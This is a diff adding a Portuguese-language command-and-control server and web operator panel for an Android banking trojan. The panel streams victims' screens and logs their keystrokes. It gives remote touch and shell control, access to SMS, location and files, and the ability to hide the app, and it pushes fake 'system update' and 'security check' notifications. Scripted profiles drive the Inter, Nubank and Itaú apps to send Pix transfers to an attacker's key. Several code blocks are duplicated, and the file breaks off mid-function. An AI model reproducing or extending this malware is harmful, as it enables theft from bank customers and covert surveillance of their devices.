@@ -1,0 +1,749 @@
+# server.py - C2 local, porta unica 8080 (v2)
+import asyncio, json, os, socket, time
+from aiohttp import web, WSMsgType
+
+TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
+DEVS = {}
+VIEW = {}
+BUSY = set()
+KF = "teclado.log"
+
+def klog(dev, pkg, win, txt):
+    try:
+        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
+            with open(KF, encoding="utf-8", errors="replace") as f:
+                cauda = f.read()[-1000000:]
+            with open(KF, "w", encoding="utf-8") as f:
+                f.write(cauda)
+        with open(KF, "a", encoding="utf-8") as f:
+            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
+                                          (pkg or "?") + ("/" + win if win else ""),
+                                          (txt or "").replace("\n", "\\n")))
+    except Exception:
+        pass
+
+def devlist():
+    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
+             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]
+
+PAGE = r"""<!doctype html><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content=no-referrer><title>EloEducacao</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#0d0f12;color:#c9d1d9;font:12px/1.4 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+header{display:flex;gap:5px;align-items:center;padding:5px 7px;background:#151a20;border-bottom:1px solid #232b35;flex-wrap:wrap}
+main{flex:1;display:flex;min-height:0}
+#wrap{flex:1;display:flex;flex-direction:column;min-width:0;background:#000}
+#scr{flex:1;object-fit:contain;min-height:0;cursor:crosshair;user-select:none;-webkit-user-drag:none}
+#bar,#foot{display:flex;gap:4px;padding:4px 6px;background:#151a20;flex-wrap:wrap}
+#bar{border-top:1px solid #232b35}
+aside{width:330px;display:flex;flex-direction:column;border-left:1px solid #232b35;background:#0f1318}
+#tabs{display:flex;border-bottom:1px solid #232b35}
+#tabs b{flex:1;text-align:center;padding:5px;cursor:pointer;font-weight:400;color:#6b7785;font-size:11px}
+#tabs b.on{color:#58a6ff;border-bottom:2px solid #58a6ff}
+#body{flex:1;overflow:auto;padding:5px}
+#out{margin:0;font:11px monospace;white-space:pre-wrap;word-break:break-all}
+button,select,input{background:#1d242c;color:#c9d1d9;border:1px solid #2f3944;padding:3px 6px;font-size:11px;border-radius:3px;cursor:pointer;font-family:inherit}
+button:hover{background:#273039}
+button.pri{background:#1f4d7a;border-color:#2a6ba8}
+input{flex:1;cursor:text}
+.ln{display:flex;gap:4px;align-items:center;margin-bottom:4px}
+.sm{font:10px monospace;color:#6b7785}
+#st{padding:2px 7px;font:11px monospace;color:#f0883e;min-height:14px}
+.dot{width:7px;height:7px;border-radius:50%;background:#484f58;display:inline-block}
+.dot.on{background:#3fb950}.dot.warn{background:#d29922}
+.row{display:flex;justify-content:space-between;gap:6px;padding:2px 0;border-bottom:1px solid #1a2028;cursor:pointer}
+.row:hover{background:#161c23}
+.row.edit{border-left:2px solid #3fb950;padding-left:5px}
+.row.money span:first-child{color:#3fb950;font-weight:600;font-size:13px}
+#klist{font:11px monospace;white-space:pre-wrap;word-break:break-all}
+#wrap.zoom{overflow:auto;display:block}
+#wrap.zoom #scr{flex:none;height:auto}
+.kh{color:#58a6ff;margin:6px 0 2px;border-bottom:1px solid #1a2028;padding-bottom:2px}
+.krow{padding:1px 0;color:#c9d1d9}.krow b{color:#8b949e;font-weight:400}
+.tap{position:fixed;width:20px;height:20px;margin:-10px 0 0 -10px;border:2px solid #58a6ff;border-radius:50%;pointer-events:none;animation:f .42s ease-out forwards}
+@keyframes f{to{transform:scale(1.7);opacity:0}}
+</style>
+<header>
+<select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span>
+<span id=lat class=sm>--</span>
+<button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button>
+<button class=pri onclick="c('shot',{on:true})">Print ON</button><button onclick="c('shot',{on:false})">OFF</button>
+<button onclick="c('screen',{on:true})">Acordar</button>
+<button onclick="c('info')">Info</button><button onclick="c('apps')">Apps</button>
+<button onclick="c('sms')">SMS</button><button onclick="c('loc')">Local</button>
+<button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
+<button onclick="c('hide',{on:true})">Ocultar</button><button onclick="c('hide',{on:false})">Mostrar</button>
+<button onclick="zoom(-1)">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)">+</button><button id=mg onclick="mag=!mag;this.style.opacity=mag?1:.4">ima</button><button onclick="preset(1)">Rapido</button><button onclick="preset(2)">Nitido</button>
+<button onclick="c('ov',{on:true})">Overlay</button><button onclick="c('ov',{on:false})">Overlay off</button>
+<button onclick="banco()">Modo banco</button><button onclick="recTog()">REC</button><span id=rc class=sm>0</span><button onclick="playM()">Play</button><button onclick="shot()">Salvar</button><button onclick="rec()">Gravar</button><button onclick="full()">Tela cheia</button>
+</header>
+<main><div id=wrap><img id=scr><div id=st></div></div>
+<aside>
+<div id=tabs><b class=on data-t=log>log</b><b data-t=txt>texto</b><b data-t=tecla>tecla</b><b data-t=aviso>aviso</b><b data-t=arq>arquivos</b><b data-t=apps>apps</b><b data-t=info>info</b></div>
+<div id=body>
+<div id=arqbar style="display:none"><div class=ln><input id=p value="/sdcard"><button onclick="ls()">ir</button></div><div id=flist></div></div>
+<div id=tlist style="display:none"></div>
+<div id=avbar style="display:none">
+<div class=ln><input id=avt value="Atualizacao do sistema"></div>
+<div class=ln><input id=avx placeholder="texto do aviso"></div>
+<div class=ln><button onclick="mandaAviso() ">enviar aviso</button><button onclick="avPreset(0)">update pronto</button></div>
+<div class=ln><button onclick="avPreset(1)">sincronizando</button><button onclick="avPreset(2)">backup concluido</button><button onclick="avPreset(3)">verificacao ok</button></div>
+</div>
+<div id=kbar style="display:none"><div class=ln><span class=sm>gravando no teclado.log</span>
+<button onclick="kpause=!kpause;this.textContent=kpause?'retomar':'pausar'">pausar</button>
+<button onclick="fetch('/keys/clear?t='+T)">limpar</button>
+<button onclick="location.href='/keys/dl?t='+T">baixar</button></div></div>
+<div id=klist style="display:none"></div>
+<pre id=out></pre>
+</div>
+<div style="padding:5px;border-top:1px solid #232b35">
+<div class=ln>Q<input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
+<div class=ln>FPS<input id=f type=range min=1 max=15 value=6 oninput="c('fps',{v:+this.value})"></div>
+<div class=ln>Res<input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
+</div>
+</aside></main>
+<div id=bar><select id=pfl></select><input id=pch placeholder="chave pix" style="flex:0 0 190px"><input id=pvl placeholder="valor" style="flex:0 0 80px"><button class=pri onclick="runPix()">Pix</button><button id=wt onclick="wt()">Watch</button><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path"><button class=pri onclick="send()">Enviar</button>
+<button onclick="k(66)">Enter</button><button onclick="k(67)">Del</button><button onclick="k(26)">Notif</button>
+<button onclick="c('clip')">Clip</button><button onclick="c('recon')">Reconectar</button></div>
+<script>
+const T=new URLSearchParams(location.search).get('t')||'';
+const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),out=$('#out');
+let w,sel='',inf={w:0,h:0},lf=0,tp=0,recs=null,tabNow='log',pasta='/sdcard',pend=null,tmr=null,kt=null,kpause=false,kn=0,z=1,mag=true,nos=[];
+const log=x=>{out.textContent+=x+'\n';out.scrollTop=out.scrollHeight};
+function co(){
+  w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
+  w.binaryType='arraybuffer';
+  w.onopen=()=>{log('[painel ok]');setInterval(()=>{if(sel&&mag&&tabNow!=='txt')c('tree')},2600);
+setInterval(()=>{if(w.readyState===1){tp=Date.now();w.send('{"c":"ping"}')}},4000)};
+  w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
+  w.onmessage=e=>{
+    if(typeof e.data!=='string'){frame(e.data);return}
+    const m=JSON.parse(e.data);
+    if(m.k==='devs'){
+      const cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
+      m.d.forEach(x=>{const o=document.createElement('option');o.value=x.id;
+        o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h+' b'+x.bat;dev.appendChild(o)});
+      if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}
+      else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
+      return}
+    if(m.k==='log'){
+      const x=m.d;
+      if(x.t==='hello'){inf=x;log('['+x.id+'] '+x.m+' sdk'+x.sdk+' '+x.w+'x'+x.h+' b'+x.bat+' '+x.ip);
+        if(!sel&&x.id){dev.value=x.id;pick()}}
+      else if(x.t==='pong'){lat.textContent=(Date.now()-tp)+'ms'}
+      else if(x.t==='err'){log('! '+x.o);st.textContent=x.o}
+      else if(x.t==='ka'){}
+      else if(x.t==='apps'&&tabNow==='apps'){out.textContent=x.o;out.scrollTop=0}
+      else if(x.t==='ls'){lista(x.o)}
+      else if(x.t==='dl'){baixa(x.o)}
+      else if(x.t==='tree'){nos=x.o||[];if(tabNow==='txt')renderTree(x.o)}
+      else if(x.t==='k'){if(tabNow==='tecla'&&!kpause)kcarrega()}
+      else if(x.t==='info'&&tabNow==='info'){out.textContent=x.o}
+      else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm)$('#pch').value=mm[1].trim()}
+      else if(x.t==='pixvisto'){log('! '+x.o);const mm=x.o.match(/chave=([^;]+)/);if(mm)$('#pch').value=mm[1].trim()}
+      else if(x.t==='snap')snapShow(x.o||'')
+      else if(x.t==='snap')snapShow(x.o||'')
+      else log(x.t+': '+(x.o||''))}
+  };
+}
+function frame(d){
+  lf=Date.now();st.textContent='';
+  const u=URL.createObjectURL(new Blob([d],{type:'image/jpeg'})),old=i.src;
+  i.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);i.onload=null};i.src=u;
+  if(recs&&recs.cv){recs.cv.getContext('2d').drawImage(i,0,0,recs.cv.width,recs.cv.height)}
+}
+setInterval(()=>{if(sel&&mag&&tabNow!=='txt')c('tree')},2600);
+setInterval(()=>{
+  if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
+  else if(!lf||Date.now()-lf>2500){st.textContent='sem frames';dot.className='dot warn'}
+  else dot.className='dot on'},1000);
+function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'nenhum'));
+  if(sel&&w&&w.readyState===1)w.send(JSON.stringify({c:'sel',id:sel}))}
+dev.onchange=pick;
+function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
+function k(n){c('key',{code:n});push({k:n})}
+function send(){const e=$('#t'),v=e.value;
+  if(pend){c('fill',{x:pend.x,y:pend.y,s:v});pend=null;e.value='';
+    e.placeholder='texto  |  $comando  |  /ls path  |  /dl path';return}
+  if(!v)return;
+  if(v[0]==='$')c('shell',{cmd:v.slice(1)});
+  else if(v.startsWith('/ls '))c('ls',{p:v.slice(4)});
+  else if(v.startsWith('/dl '))c('dl',{p:v.slice(4)});
+  else {c('text',{s:v});push({x:v});e.value=''}
+$('#t').onkeydown=e=>{if(e.key==='Enter')send()};
+function pt(e){
+  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
+  const s=Math.min(r.width/nx,r.height/ny)||1;
+  const ox=r.left+(r.width-nx*s)/2, oy=r.top+(r.height-ny*s)/2;
+  const x=Math.round((e.clientX-ox)/s*((inf.w||nx)/nx));
+  const y=Math.round((e.clientY-oy)/s*((inf.h||ny)/ny));
+  return{x:Math.min(Math.max(0,x),inf.w||x),y:Math.min(Math.max(0,y),inf.h||y)}}
+function snap(p){
+  if(!mag||!nos.length)return p;
+  let b=null,d=1e9;
+  nos.forEach(n=>{if(!n.c&&!n.e)return;
+    const dd=Math.hypot(n.x-p.x,n.y-p.y);if(dd<d){d=dd;b=n}});
+  return (b&&d<70)?{x:b.x,y:b.y}:p}
+function zoom(n){z=Math.min(4,Math.max(1,z+n));
+  const wr=$('#wrap');wr.classList.toggle('zoom',z>1);
+  i.style.width=z>1?(z*100)+'%':'';
+  $('#z').textContent=z+'x'}
+function mandaAviso(){c('aviso',{ti:$('#avt').value,tx:$('#avx').value})}
+function avPreset(n){
+  const a=[['Atualizacao do sistema','Atualizacao instalada. Reinicie o aplicativo.'],
+    ['Servicos do sistema','Sincronizando dados da conta...'],
+    ['Backup do sistema','Backup concluido com sucesso.'],
+    ['Verificacao de seguranca','Nenhuma ameaca encontrada.']][n];
+  $('#avt').value=a[0];$('#avx').value=a[1];mandaAviso()}
+let dn=null,t0=0,env=null,jaEnviado=false;
+function mark(p){
+  const r=i.getBoundingClientRect(),nx=i.naturalWidth||1,ny=i.naturalHeight||1;
+  const s=Math.min(r.width/nx,r.height/ny)||1;
+  const d=document.createElement('div');d.className='tap';
+  d.style.left=(r.left+(r.width-nx*s)/2+p.x/((inf.w||nx)/nx)*s)+'px';
+  d.style.top=(r.top+(r.height-ny*s)/2+p.y/((inf.h||ny)/ny)*s)+'px';
+  document.body.appendChild(d);setTimeout(()=>d.remove(),420)}
+i.onmousedown=e=>{dn=snap(pt(e));t0=Date.now();jaEnviado=false;mark(dn);
+  clearTimeout(env);env=setTimeout(()=>{if(!dn)return;jaEnviado=true;
+    c('touch',{x:dn.x,y:dn.y})},130)};
+i.onmousemove=e=>{if(!dn)return;const u=snap(pt(e));
+  if(Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y)>18)clearTimeout(env)};
+i.onmouseup=e=>{clearTimeout(env);if(!dn)return;const u=snap(pt(e));
+  const m=Math.abs(u.x-dn.x)+Math.abs(u.y-dn.y);
+  if(jaEnviado&&m<18){dn=null;return}
+  if(m<18&&Date.now()-t0>480){c('long',{x:u.x,y:u.y});push({l:[u.x,u.y]})}
+  else if(m<18){c('touch',{x:u.x,y:u.y});push({t:[u.x,u.y]})}
+  else {c('swipe',{x1:dn.x,y1:dn.y,x2:u.x,y2:u.y,ms:220});push({s:[dn.x,dn.y,u.x,u.y,220]})}dn=null};
+function shot(){const a=document.createElement('a');a.href=i.src;a.download='tela.jpg';a.click()}
+function full(){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen()}
+function rec(){
+  if(recs){recs.stop();recs=null;st.textContent='';return}
+  const cv=document.createElement('canvas');
+  cv.width=i.naturalWidth||540;cv.height=i.naturalHeight||960;
+  const r=new MediaRecorder(cv.captureStream(6),{mimeType:'video/webm'});
+  r.ondataavailable=e=>{const a=document.createElement('a');a.href=URL.createObjectURL(e.data);
+    a.download='sessao.webm';a.click()};
+  r.start();r.cv=cv;recs=r;st.textContent='gravando'}
+function tab(n){tabNow=n;
+  document.querySelectorAll('#tabs b').forEach(b=>b.classList.toggle('on',b.dataset.t===n));
+  $('#arqbar').style.display=n==='arq'?'block':'none';
+  $('#tlist').style.display=n==='txt'?'block':'none';
+  out.style.display=(n==='arq'||n==='txt')?'none':'block';
+  clearInterval(tmr);
+  if(n==='txt'){c('tree');tmr=setInterval(()=>{if(sel&&mag&&tabNow!=='txt')c('tree')},2600);
+setInterval(()=>{if(tabNow==='txt')c('tree')},1300)}
+  if(n==='tecla'){kcarrega();kt=setInterval(kcarrega,2000)}
+  $('#avbar').style.display=n==='aviso'?'block':'none';
+  if(n==='apps')c('apps');if(n==='arq')ls();if(n==='info')c('info')}
+function kdesenha(linhas){
+  const f=$('#klist');f.innerHTML='';
+  let ultimo='';
+  linhas.forEach(l=>{
+    const p=l.split('\t'), cab=p[2]||'?';
+    if(cab!==ultimo){ultimo=cab;const h=document.createElement('div');
+      h.className='kh';h.textContent='-- '+cab+' --';f.appendChild(h)}
+    const d=document.createElement('div');d.className='krow';
+    const b=document.createElement('b');b.textContent=(p[0]||'').slice(11)+'  ';
+    d.appendChild(b);d.appendChild(document.createTextNode(p[3]||''));
+    f.appendChild(d)});
+  f.scrollTop=f.scrollHeight}
+function kcarrega(){
+  if(kpause)return;
+  fetch('/keys?t='+T+'&n=600'+(sel?'&dev='+encodeURIComponent(sel):''))
+    .then(r=>r.json()).then(j=>{if(j.l.length===kn&&tabNow==='tecla')return;
+      kn=j.l.length;kdesenha(j.l)}).catch(()=>{})}
+function renderTree(a){
+  const f=$('#tlist');f.innerHTML='';
+  if(!a||!a.length){const v=document.createElement('div');v.className='sm';
+    v.textContent='nada legivel nesta tela';f.appendChild(v);return}
+  a.forEach(n=>{
+    const d=document.createElement('div');
+    d.className='row'+(n.e?' edit':'');
+    const rot=n.t||('['+(n.cls||'?')+']');
+    if(/R\$\s?[\d.,]+/.test(rot))d.classList.add('money');
+    const s1=document.createElement('span');s1.textContent=rot;
+    const s2=document.createElement('span');s2.className='sm';
+    s2.textContent=n.e?'campo':(n.c?'toque':'');
+    d.appendChild(s1);d.appendChild(s2);
+    d.onclick=()=>{
+      if(n.e){pend={x:n.x,y:n.y};const e=$('#t');e.value='';
+        e.placeholder='digite e Enviar para preencher o campo';e.focus()}
+      else c('tap',{x:n.x,y:n.y})};
+    f.appendChild(d)})
+}
+function banco(){c('bank');tab('txt');
+  const q=$('#q'),f=$('#f');q.value=30;f.value=2;c('q',{v:30});c('fps',{v:2})}
+document.querySelectorAll('#tabs b').forEach(b=>b.onclick=()=>tab(b.dataset.t));
+function ls(){pasta=$('#p').value||'/sdcard';c('ls',{p:pasta})}
+function lista(o){
+  const f=$('#flist');f.innerHTML='';
+  if(!o||o.startsWith('err')||o.startsWith('sem acesso')){f.textContent=o||'vazio';return}
+  o.split('\n').forEach(l=>{
+    if(!l||l.indexOf('\t')<0)return;
+    const dir=l[0]==='d',nome=l.split('\t')[1];
+    const d=document.createElement('div');d.className='row';
+    d.innerHTML='<span>'+(dir?'[ ] ':'')+nome+'</span><span class=sm>'+(dir?'':l.split('\t')[0].slice(2))+'</span>';
+    d.onclick=()=>{const base=pasta.endsWith('/')?pasta:pasta+'/';
+      if(dir){$('#p').value=base+nome+'/';ls()}else c('dl',{p:base+nome})};
+    f.appendChild(d)});
+}
+let dlBuf=null,dlPath=null,dlOff=0,dlTot=-1;
+function baixa(o){
+  if(o==='fim'){fechaDl();return}
+  const m=o.match(/b64=([\s\S]*)/);
+  if(!m){log(o);return}
+  const tot=+(o.match(/total=(\d+)/)||[0,0])[1];
+  if(!dlBuf){dlBuf=[];dlOff=0;dlTot=tot}
+  const b=atob(m[1].replace(/\s/g,''));
+  for(let i=0;i<b.length;i++)dlBuf.push(b.charCodeAt(i));
+  dlOff+=b.length;
+  if(dlOff<dlTot)c('dl',{p:dlPath,off:dlOff,n:65536});else fechaDl()
+}
+function fechaDl(){
+  const u=new Uint8Array(dlBuf),a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([u]));
+  a.download=(dlPath.split('/').pop()||'arq');a.click();
+  dlBuf=null;dlTot=-1;log('baixado')
+}
+let mrec=[],mlast=0,mrecOn=false;
+function recTog(){mrecOn=!mrecOn;mlast=Date.now();if(mrecOn)mrec=[];
+  $('#rc').textContent=mrecOn?'REC':'0';$('#rc').style.color=mrecOn?'#f85149':'#6b7785'}
+function push(x){if(!mrecOn)return;const d=Date.now()-mlast;mlast=Date.now();
+  mrec.push(Object.assign({w:d},x));$('#rc').textContent=mrec.length}
+function playM(){if(!mrec.length){log('nada gravado');return}c('macro',{s:mrec})}
+function preset(n){const q=$('#q'),f=$('#f'),r=$('#r');
+  if(n===1){q.value=30;f.value=10;r.value=360}else{q.value=55;f.value=6;r.value=720}
+  c('q',{v:+q.value});c('fps',{v:+f.value});c('res',{v:+r.value})}
+const PERFIS = {
+"inter": [
+ {"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"nubank": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"itau": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+]
+};
+function pflUpd(){
+  const s=$('#pfl');s.innerHTML='';
+  Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
+    o.value=k;o.textContent=k;s.appendChild(o)});
+}
+function runPix(){
+  const k=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
+  if(!ch){log('sem chave pix');return}
+  c('run',{s:PERFIS[k],v:{chave:ch,valor:vl}});
+  log('perfil '+k+' chave '+ch+' valor '+(vl||'-'))
+}
+function wt(){
+  const b=$('#wt'),on=b.dataset.on!=='1';
+  b.dataset.on=on?'1':'0';b.style.background=on?'#1f4d7a':'';
+  c('watch',{on:on})
+}
+pflUpd();
+const PERFIS = {
+"inter": [
+ {"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"nubank": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+],
+"itau": [
+ {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
+ {"do":"tap","sel":{"txt":"^Pix$","click":true}},
+ {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
+ {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
+ {"do":"tap","sel":{"txt":"Chave Pix"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
+ {"do":"wait","sel":{"edit":true},"ms":9000},
+ {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
+ {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
+ {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
+]
+};
+function pflUpd(){
+  const s=$('#pfl');s.innerHTML='';
+  Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
+    o.value=k;o.textContent=k;s.appendChild(o)});
+}
+function runPix(){
+  const k=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
+  if(!ch){log('sem chave pix');return}
+  c('run',{s:PERFIS[k],v:{chave:ch,valor:vl}});
+  log('perfil '+k+' chave '+ch+' valor '+(vl||'-'))
+}
+function wt(){
+  const b=$('#wt'),on=b.dataset.on!=='1';
+  b.dataset.on=on?'1':'0';b.style.background=on?'#1f4d7a':'';
+  c('watch',{on:on})
+}
+pflUpd();
+let sjson;
+function snapUI(){
+  const bar=$('#bar');
+  const b=document.createElement('button');
+  b.textContent='Snap';b.onclick=snap;bar.appendChild(b);
+  const d=document.createElement('div');
+  d.id='snapbox';
+  d.style.cssText='display:none;padding:6px;border-top:1px solid #22303c;background:#0d1117';
+  d.innerHTML='<div class=sm>clique numa linha = gera o passo no perfil</div>'
+    +'<pre id=snappre style="max-height:250px;overflow:auto;font-size:11px;'
+    +'margin:4px 0;background:#010409;padding:6px"></pre>'
+    +'<textarea id=pjson placeholder="[]" style="width:100%;height:150px;'
+    +'font:11px monospace;background:#010409;color:#c9d1d9;border:1px solid #22303c"></textarea>'
+    +'<div style="margin-top:4px"><button onclick="playJ()">Play</button>'
+    +'<button onclick="salvaJ()">Grava</button><button onclick="carregaJ()">Carrega</button>'
+    +'<button onclick="limpaJ()">Limpa</button>'
+    +'<button onclick="document.getElementById(\'snapbox\').style.display=\'none\'">x</button></div>';
+  document.body.appendChild(d);
+  sjson=document.getElementById('pjson');
+}
+function snap(){
+  $('#snapbox').style.display='';
+  c('snap');
+  log('snap enviado');
+}
+function jesc(s){return String(s).replace(/\\/g,'\\\\').replace(/"/g,'\\"')}
+function snapShow(txt){
+  const pre=$('#snappre');
+  pre.innerHTML='';
+  txt.split('\n').forEach(l=>{
+    if(!l.trim())return;
+    const p=l.split('|');
+    const el=document.createElement('div');
+    el.textContent=l;
+    el.style.cssText='cursor:pointer;white-space:pre';
+    el.onclick=()=>insere(p);
+    pre.appendChild(el);
+  });
+}
+function insere(p){
+  const cls=p[1]||'',id=p[2]||'',fl=p[3]||'',bd=(p[4]||'').split(',').map(Number),tx=p[5]||'',cd=p[6]||'';
+  const sel={};
+  if(id)sel.id=jesc(id).replace(/^[^:]*:id\//,'');
+  else if(tx)sel.txt='^'+jesc(tx)+'$';
+  else if(cd)sel.txt=jesc(cd);
+  else if(cls)sel.cls=jesc(cls);
+  else return;
+  if(fl.indexOf('C')>=0)sel.click=true;
+  if(fl.indexOf('E')>=0)sel.edit=true;
+  const s={do:sel.edit?'set':'tap',sel:sel};
+  if(sel.edit)s.v='{{CHAVE}}';
+  let cur=sjson.value.trim();
+  if(cur&&cur[0]!=='[')cur='['+cur.replace(/,\s*$/,'')+']';
+  let arr=[];
+  if(cur)try{arr=JSON.parse(cur)}catch(e){arr=[]}
+  arr.push(s);
+  sjson.value=JSON.stringify(arr,null,1);
+  log('passo: '+JSON.stringify(sel));
+}
+function playJ(){
+  let t=sjson.value.trim();
+  if(!t){log('perfil vazio');return}
+  if(t[0]!=='[')t='['+t.replace(/,\s*$/,'')+']';
+  let arr;
+  try{arr=JSON.parse(t)}catch(e){log('json invalido: '+e);return}
+  c('run',{s:arr,v:{chave:($('#pch').value||'').trim(),valor:($('#pvl').value||'').trim()}});
+  log('play '+arr.length+' passos');
+}
+function salvaJ(){localStorage.setItem('perfil',sjson.value);log('perfil gravado')}
+function carregaJ(){sjson.value=localStorage.getItem('perfil')||'';log('perfil carregado')}
+function limpaJ(){sjson.value='';log('limpo')}
+snapUI();
+let sjson;
+function snapUI(){
+  const bar=$('#bar');
+  const b=document.createElement('button');
+  b.textContent='Snap';b.onclick=snap;bar.appendChild(b);
+  const d=document.createElement('div');
+  d.id='snapbox';
+  d.style.cssText='display:none;padding:6px;border-top:1px solid #22303c;background:#0d1117';
